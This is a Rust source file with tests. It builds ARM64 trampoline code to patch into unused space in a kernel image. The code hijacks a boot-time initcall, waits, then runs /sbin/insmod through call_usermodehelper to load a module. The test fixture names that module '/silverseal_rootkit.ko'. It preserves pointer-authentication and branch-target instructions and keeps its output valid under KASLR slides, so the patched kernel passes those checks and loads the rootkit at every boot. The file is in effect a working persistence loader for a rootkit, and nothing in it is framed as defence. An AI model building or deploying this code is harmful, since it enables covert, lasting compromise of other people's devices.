//! Position-independent ARM64 deferred module-loader templates.
//!
//! Executable stager/worker code lives in a text cave. The work item, strings,
//! and argv live in a separate writable cave. Every target-bearing instruction
//! is PC-relative, so a common kernel KASLR slide preserves the generated bytes.

pub const MAX_CODE_SIZE: usize = 256;
pub const MIN_CODE_CAVE_CAPACITY: usize = MAX_CODE_SIZE;
pub const WORK_STRUCT_SIZE: usize = 32;
pub const PATH_BUFFER_SIZE: usize = 128;
pub const ARGV_SIZE: usize = 24;
pub const DATA_SIZE: usize = WORK_STRUCT_SIZE + PATH_BUFFER_SIZE + ARGV_SIZE;
pub const MIN_DATA_CAVE_CAPACITY: usize = DATA_SIZE;

const PATH_BUFFER_OFFSET: usize = WORK_STRUCT_SIZE;
const ARGV_OFFSET: usize = WORK_STRUCT_SIZE + PATH_BUFFER_SIZE;
const WORKER_OFFSET: usize = 80;
const CODE_LEN: usize = 172;
const HELPER_PATH: &[u8] = b"/sbin/insmod\0";

const BTI_C: u32 = 0xd503_245f;
const PACIASP: u32 = 0xd503_233f;
const AUTIASP: u32 = 0xd503_23bf;
const SCS_PUSH_LR: u32 = 0xf800_865e;
const SCS_POP_LR: u32 = 0xf85f_8e5e;
const STP_FP_LR_PRE_16: u32 = 0xa9bf_7bfd;
const LDR_FP_POST_16: u32 = 0xf841_07fd;
const MOV_FP_SP: u32 = 0x9100_03fd;
const ADD_X1_X0_8: u32 = 0x9100_2001;
const STR_X1_X0_8: u32 = 0xf900_0401;
const STR_X1_X0_16: u32 = 0xf900_0801;
const STR_X1_X0_24: u32 = 0xf900_0c01;
const MOV_W0_10000: u32 = 0x5284_e200;
const STR_X0_X1: u32 = 0xf900_0020;
const STR_X4_X1_8: u32 = 0xf900_0424;
const STR_XZR_X1_16: u32 = 0xf900_083f;
const MOV_X2_XZR: u32 = 0xaa1f_03e2;
const MOV_W3_UMH_WAIT_PROC: u32 = 0x5280_0043;
const RET: u32 = 0xd65f_03c0;
const NOP: u32 = 0xd503_201f;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum TrampolineError {
    InvalidAddress,
    UnalignedAddress,
    InvalidModulePath,
    AddressOverflow,
    BranchOutOfRange,
    AdrpOutOfRange,
    ImmediateOutOfRange,
    RelativeOutOfRange,
}

pub fn decode_prel32(entry_virtual: usize, relative: i32) -> Result<usize, TrampolineError> {
    validate_instruction_address(entry_virtual)?;
    let target = if relative >= 0 {
        entry_virtual
            .checked_add(relative as usize)
            .ok_or(TrampolineError::AddressOverflow)
    } else {
        entry_virtual
            .checked_sub(relative.unsigned_abs() as usize)
            .ok_or(TrampolineError::AddressOverflow)
    }?;
    validate_instruction_address(target)?;
    Ok(target)
}

pub fn encode_prel32(
    entry_virtual: usize,
    target_virtual: usize,
) -> Result<[u8; 4], TrampolineError> {
    validate_instruction_address(entry_virtual)?;
    validate_instruction_address(target_virtual)?;
    let delta = target_virtual as i128 - entry_virtual as i128;
    let relative = i32::try_from(delta).map_err(|_| TrampolineError::RelativeOutOfRange)?;
    Ok(relative.to_le_bytes())
}

/// Generated code and writable data for the delayed loader.
pub struct Arm64Trampoline {
    code: [u8; MAX_CODE_SIZE],
    code_len: usize,
    data: [u8; DATA_SIZE],
}

impl Arm64Trampoline {
    #[allow(clippy::too_many_arguments)]
    pub fn build(
        code_cave_virtual: usize,
        data_cave_virtual: usize,
        schedule_work_virtual: usize,
        msleep_virtual: usize,
        call_usermodehelper_virtual: usize,
        original_initcall_virtual: usize,
        module_path: &[u8],
    ) -> Result<Self, TrampolineError> {
        for address in [
            code_cave_virtual,
            data_cave_virtual,
            schedule_work_virtual,
            msleep_virtual,
            call_usermodehelper_virtual,
            original_initcall_virtual,
        ] {
            validate_instruction_address(address)?;
        }
        if !data_cave_virtual.is_multiple_of(8) {
            return Err(TrampolineError::UnalignedAddress);
        }
        if module_path.is_empty()
            || module_path[0] != b'/'
            || module_path.contains(&0)
            || HELPER_PATH
                .len()
                .checked_add(module_path.len())
                .and_then(|len| len.checked_add(1))
                .is_none_or(|len| len > PATH_BUFFER_SIZE)
        {
            return Err(TrampolineError::InvalidModulePath);
        }
        code_cave_virtual
            .checked_add(CODE_LEN)
            .ok_or(TrampolineError::AddressOverflow)?;
        data_cave_virtual
            .checked_add(DATA_SIZE)
            .ok_or(TrampolineError::AddressOverflow)?;

        let worker_virtual = code_cave_virtual
            .checked_add(WORKER_OFFSET)
            .ok_or(TrampolineError::AddressOverflow)?;
        let helper_virtual = data_cave_virtual
            .checked_add(PATH_BUFFER_OFFSET)
            .ok_or(TrampolineError::AddressOverflow)?;
        let module_virtual = helper_virtual
            .checked_add(HELPER_PATH.len())
            .ok_or(TrampolineError::AddressOverflow)?;
        let argv_virtual = data_cave_virtual
            .checked_add(ARGV_OFFSET)
            .ok_or(TrampolineError::AddressOverflow)?;

        let mut generated = Self {
            code: [0; MAX_CODE_SIZE],
            code_len: CODE_LEN,
            data: [0; DATA_SIZE],
        };
        let code = &mut generated.code;

        // Initcall stager.
        write_instruction(code, 0, BTI_C);
        write_instruction(code, 4, PACIASP);
        write_instruction(code, 8, SCS_PUSH_LR);
        write_instruction(code, 12, STP_FP_LR_PRE_16);
        write_instruction(code, 16, MOV_FP_SP);
        write_adrp_add(code, code_cave_virtual, 20, 0, data_cave_virtual)?;
        write_instruction(code, 28, ADD_X1_X0_8);
        write_instruction(code, 32, STR_X1_X0_8);
        write_instruction(code, 36, STR_X1_X0_16);
        write_adrp_add(code, code_cave_virtual, 40, 1, worker_virtual)?;
        write_instruction(code, 48, STR_X1_X0_24);
        write_instruction(
            code,
            52,
            encode_branch_link(code_cave_virtual, 52, schedule_work_virtual)?,
        );
        write_instruction(code, 56, SCS_POP_LR);
        write_instruction(code, 60, LDR_FP_POST_16);
        write_instruction(code, 64, AUTIASP);
        write_instruction(
            code,
            68,
            encode_branch(code_cave_virtual, 68, original_initcall_virtual)?,
        );
        for offset in (72..WORKER_OFFSET).step_by(4) {
            write_instruction(code, offset, NOP);
        }

        // Workqueue callback.
        write_instruction(code, WORKER_OFFSET, BTI_C);
        write_instruction(code, 84, PACIASP);
        write_instruction(code, 88, SCS_PUSH_LR);
        write_instruction(code, 92, STP_FP_LR_PRE_16);
        write_instruction(code, 96, MOV_FP_SP);
        write_instruction(code, 100, MOV_W0_10000);
        write_instruction(
            code,
            104,
            encode_branch_link(code_cave_virtual, 104, msleep_virtual)?,
        );
        write_adrp_add(code, code_cave_virtual, 108, 0, helper_virtual)?;
        write_adrp_add(code, code_cave_virtual, 116, 1, argv_virtual)?;
        write_instruction(code, 124, STR_X0_X1);
        write_adrp_add(code, code_cave_virtual, 128, 4, module_virtual)?;
        write_instruction(code, 136, STR_X4_X1_8);
        write_instruction(code, 140, STR_XZR_X1_16);
        write_instruction(code, 144, MOV_X2_XZR);
        write_instruction(code, 148, MOV_W3_UMH_WAIT_PROC);
        write_instruction(
            code,
            152,
            encode_branch_link(code_cave_virtual, 152, call_usermodehelper_virtual)?,
        );
        write_instruction(code, 156, SCS_POP_LR);
        write_instruction(code, 160, LDR_FP_POST_16);
        write_instruction(code, 164, AUTIASP);
        write_instruction(code, 168, RET);

        let helper_end = PATH_BUFFER_OFFSET + HELPER_PATH.len();
        generated.data[PATH_BUFFER_OFFSET..helper_end].copy_from_slice(HELPER_PATH);
        let module_end = helper_end + module_path.len();
        generated.data[helper_end..module_end].copy_from_slice(module_path);
        generated.data[module_end] = 0;
        Ok(generated)
    }

    #[must_use]
    pub fn code_bytes(&self) -> &[u8] {
        &self.code[..self.code_len]
    }

    #[must_use]
    pub fn data_bytes(&self) -> &[u8] {
        &self.data
    }

    #[must_use]
    pub const fn worker_offset() -> usize {
        WORKER_OFFSET
    }
}

fn validate_instruction_address(address: usize) -> Result<(), TrampolineError> {
    if address == 0 {
        return Err(TrampolineError::InvalidAddress);
    }
    if !address.is_multiple_of(4) {
        return Err(TrampolineError::UnalignedAddress);
    }
    Ok(())
}

fn encode_branch_link(
    base: usize,
    instruction_offset: usize,
    target: usize,
) -> Result<u32, TrampolineError> {
    encode_branch_with_opcode(base, instruction_offset, target, 0x9400_0000)
}

fn encode_branch(
    base: usize,
    instruction_offset: usize,
    target: usize,
) -> Result<u32, TrampolineError> {
    encode_branch_with_opcode(base, instruction_offset, target, 0x1400_0000)
}

fn encode_branch_with_opcode(
    base: usize,
    instruction_offset: usize,
    target: usize,
    opcode: u32,
) -> Result<u32, TrampolineError> {
    let instruction_virtual = base
        .checked_add(instruction_offset)
        .ok_or(TrampolineError::AddressOverflow)?;
    let delta = target as i128 - instruction_virtual as i128;
    if delta % 4 != 0 {
        return Err(TrampolineError::UnalignedAddress);
    }
    let words = delta / 4;
    if !(-(1_i128 << 25)..(1_i128 << 25)).contains(&words) {
        return Err(TrampolineError::BranchOutOfRange);
    }
    Ok(opcode | ((words as u32) & 0x03ff_ffff))
}

fn write_adrp_add(
    bytes: &mut [u8],
    code_base: usize,
    instruction_offset: usize,
    register: u8,
    target: usize,
) -> Result<(), TrampolineError> {
    let instruction_virtual = code_base
        .checked_add(instruction_offset)
        .ok_or(TrampolineError::AddressOverflow)?;
    write_instruction(
        bytes,
        instruction_offset,
        encode_adrp(register, instruction_virtual, target)?,
    );
    write_instruction(
        bytes,
        instruction_offset + 4,
        encode_add_immediate(register, register, target & 0xfff)?,
    );
    Ok(())
}

fn encode_adrp(
    register: u8,
    instruction_virtual: usize,
    target_virtual: usize,
) -> Result<u32, TrampolineError> {
    if register > 31 {
        return Err(TrampolineError::AdrpOutOfRange);
    }
    let instruction_page = instruction_virtual & !0xfff;
    let target_page = target_virtual & !0xfff;
    let delta = target_page as i128 - instruction_page as i128;
    if delta % 4096 != 0 {
        return Err(TrampolineError::UnalignedAddress);
    }
    let pages = delta / 4096;
    if !(-(1_i128 << 20)..(1_i128 << 20)).contains(&pages) {
        return Err(TrampolineError::AdrpOutOfRange);
    }
    let immediate = (pages as u32) & 0x001f_ffff;
    let immlo = immediate & 0x3;
    let immhi = (immediate >> 2) & 0x7ffff;
    Ok(0x9000_0000 | (immlo << 29) | (immhi << 5) | u32::from(register))
}

fn encode_add_immediate(
    destination: u8,
    source: u8,
    immediate: usize,
) -> Result<u32, TrampolineError> {
    if destination > 31 || source > 31 || immediate > 0xfff {
        return Err(TrampolineError::ImmediateOutOfRange);
    }
    Ok(
        0x9100_0000
            | ((immediate as u32) << 10)
            | (u32::from(source) << 5)
            | u32::from(destination),
    )
}

fn write_instruction(bytes: &mut [u8], offset: usize, instruction: u32) {
    bytes[offset..offset + 4].copy_from_slice(&instruction.to_le_bytes());
}

#[cfg(test)]
mod tests {
    extern crate std;

    use super::*;

    const CODE: usize = 0xffff_8000_8001_0b84;
    const DATA: usize = 0xffff_8000_843e_6808;
    const SCHEDULE: usize = 0xffff_8000_8003_d578;
    const MSLEEP: usize = 0xffff_8000_8029_81b0;
    const UMH: usize = 0xffff_8000_8015_e2f0;
    const ORIGINAL: usize = 0xffff_8000_82fa_0758;
    const MODULE: &[u8] = b"/silverseal_rootkit.ko";

    fn fixture(slide: usize) -> Arm64Trampoline {
        Arm64Trampoline::build(
            CODE + slide,
            DATA + slide,
            SCHEDULE + slide,
            MSLEEP + slide,
            UMH + slide,
            ORIGINAL + slide,
            MODULE,
        )
        .unwrap()
    }

    fn read_u32(bytes: &[u8], offset: usize) -> u32 {
        u32::from_le_bytes(bytes[offset..offset + 4].try_into().unwrap())
    }

    fn decode_branch_target(instruction: u32, instruction_virtual: usize) -> usize {
        let immediate = instruction & 0x03ff_ffff;
        let words = ((immediate as i32) << 6) >> 6;
        (instruction_virtual as isize + words as isize * 4) as usize
    }

    fn decode_adrp_add_target(adrp: u32, add: u32, instruction_virtual: usize) -> usize {
        let immediate = (((adrp >> 5) & 0x7ffff) << 2) | ((adrp >> 29) & 3);
        let pages = ((immediate as i32) << 11) >> 11;
        let page = (instruction_virtual & !0xfff) as i128 + i128::from(pages) * 4096;
        let low = usize::try_from((add >> 10) & 0xfff).unwrap();
        usize::try_from(page).unwrap() + low
    }

    #[test]
    fn emits_direct_schedule_work_and_preserves_original_initcall() {
        let generated = fixture(0);
        let code = generated.code_bytes();
        assert_eq!(read_u32(code, 0), BTI_C);
        assert_eq!(read_u32(code, 4), PACIASP);
        assert_eq!(
            decode_branch_target(read_u32(code, 52), CODE + 52),
            SCHEDULE
        );
        assert_eq!(
            decode_branch_target(read_u32(code, 68), CODE + 68),
            ORIGINAL
        );
        assert_eq!(read_u32(code, WORKER_OFFSET), BTI_C);
        assert_eq!(
            decode_branch_target(read_u32(code, 104), CODE + 104),
            MSLEEP
        );
        assert_eq!(read_u32(code, 100), MOV_W0_10000);
        assert_eq!(decode_branch_target(read_u32(code, 152), CODE + 152), UMH);
    }

    #[test]
    fn separates_writable_data_from_executable_code() {
        let generated = fixture(0);
        let code = generated.code_bytes();
        let data = generated.data_bytes();
        assert_eq!(
            decode_adrp_add_target(read_u32(code, 20), read_u32(code, 24), CODE + 20),
            DATA
        );
        assert_eq!(
            decode_adrp_add_target(read_u32(code, 40), read_u32(code, 44), CODE + 40),
            CODE + WORKER_OFFSET
        );
        assert_eq!(read_u32(code, 32), STR_X1_X0_8);
        assert_eq!(read_u32(code, 36), STR_X1_X0_16);
        assert!(data[..WORK_STRUCT_SIZE].iter().all(|byte| *byte == 0));
        assert_eq!(
            &data[PATH_BUFFER_OFFSET..PATH_BUFFER_OFFSET + HELPER_PATH.len()],
            HELPER_PATH
        );
        let module_start = PATH_BUFFER_OFFSET + HELPER_PATH.len();
        assert_eq!(&data[module_start..module_start + MODULE.len()], MODULE);
        assert_eq!(data[module_start + MODULE.len()], 0);
        assert!(data[ARGV_OFFSET..].iter().all(|byte| *byte == 0));
    }

    #[test]
    fn output_is_invariant_under_a_common_kaslr_slide() {
        let base = fixture(0);
        let slid = fixture(0x2400_0000);
        assert_eq!(base.code_bytes(), slid.code_bytes());
        assert_eq!(base.data_bytes(), slid.data_bytes());
    }

    #[test]
    fn rejects_invalid_paths_addresses_and_ranges() {
        assert_eq!(
            Arm64Trampoline::build(0, DATA, SCHEDULE, MSLEEP, UMH, ORIGINAL, MODULE).err(),
            Some(TrampolineError::InvalidAddress)
        );
        assert_eq!(
            Arm64Trampoline::build(CODE, DATA + 1, SCHEDULE, MSLEEP, UMH, ORIGINAL, MODULE).err(),
            Some(TrampolineError::UnalignedAddress)
        );
        assert_eq!(
            Arm64Trampoline::build(CODE, DATA, SCHEDULE, MSLEEP, UMH, ORIGINAL, b"relative").err(),
            Some(TrampolineError::InvalidModulePath)
        );
        assert_eq!(
            Arm64Trampoline::build(
                CODE,
                DATA,
                CODE + (1 << 27) + 52,
                MSLEEP,
                UMH,
                ORIGINAL,
                MODULE,
            )
            .err(),
            Some(TrampolineError::BranchOutOfRange)
        );
    }

    #[test]
    fn encodes_and_decodes_prel32_under_a_common_slide() {
        let entry = 0xffff_8000_831c_e498;
        let encoded = encode_prel32(entry, CODE).unwrap();
        assert_eq!(
            encode_prel32(entry + 0x4000_0000, CODE + 0x4000_0000).unwrap(),
            encoded
        );
        assert_eq!(decode_prel32(entry, i32::from_le_bytes(encoded)), Ok(CODE));
    }
}
